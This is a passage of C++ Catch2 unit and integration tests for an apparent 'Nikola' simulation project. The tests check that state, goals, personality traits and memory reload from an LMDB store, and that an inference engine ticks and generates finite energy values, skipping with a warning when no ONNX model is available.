        LmdbStateStore store(tmp.path + "/full.mdb");

        NikolaState state;
        uint64_t tick = 0;
        REQUIRE(store.load_latest_state(state, tick));
        CHECK(tick == 500);
        CHECK(state.atp == Approx(0.75f).margin(0.01f));

        GoalSystem goals;
        REQUIRE(goals.deserialize(goal_data));
        CHECK(goals.goal_count() == 2);

        PersonalityDrift drift;
        REQUIRE(drift.from_json(personality_json));
        CHECK(drift.trait(TraitAxis::CURIOUS_FOCUSED) == Approx(0.6f).margin(0.01f));

        AutobiographicalMemory mem;
        CHECK(store.load_autobiography(mem) == 1);
    }
}

// ============================================================================
// §G — Inference Server (Unit-Level Integration)
// ============================================================================

TEST_CASE("§G-1 NikolaInference constructs and ticks without crash",
          "[v027][integration][inference]") {
    nikola::inference::InferenceConfig cfg;
    cfg.grid_n = 3;
    cfg.steps_per_tick = 10;
    cfg.decode_top_k = 5;
    cfg.enable_gpu = false;
    cfg.enable_npt = false;
    cfg.model_path = "";  // No model file — skip ONNX load
    cfg.vocabulary = {"hello", "world", "physics", "wave", "energy"};

    try {
        nikola::inference::NikolaInference engine(cfg);
        engine.inject("test input");

        auto result = engine.tick();
        CHECK(std::isfinite(result.energy));
        CHECK(result.tick == 1);
    } catch (const std::exception& e) {
        // ONNX model not available — that's acceptable
        WARN("NikolaInference skipped (model unavailable): " << e.what());
    }
}

TEST_CASE("§G-2 NikolaInference multi-tick generation",
          "[v027][integration][inference]") {
    nikola::inference::InferenceConfig cfg;
    cfg.grid_n = 3;
    cfg.steps_per_tick = 10;
    cfg.decode_top_k = 5;
    cfg.enable_gpu = false;
    cfg.enable_npt = false;
    cfg.model_path = "";
    cfg.vocabulary = {"hello", "world", "test", "physics", "energy",
                      "wave", "quantum", "field", "torus", "think"};

    try {
        nikola::inference::NikolaInference engine(cfg);
        engine.inject("What is physics?");

        auto results = engine.generate(20);
        REQUIRE(results.size() == 20);

        for (const auto& r : results) {
            CHECK(std::isfinite(r.energy));
        }
    } catch (const std::exception& e) {
        WARN("NikolaInference skipped (model unavailable): " << e.what());
    }
}
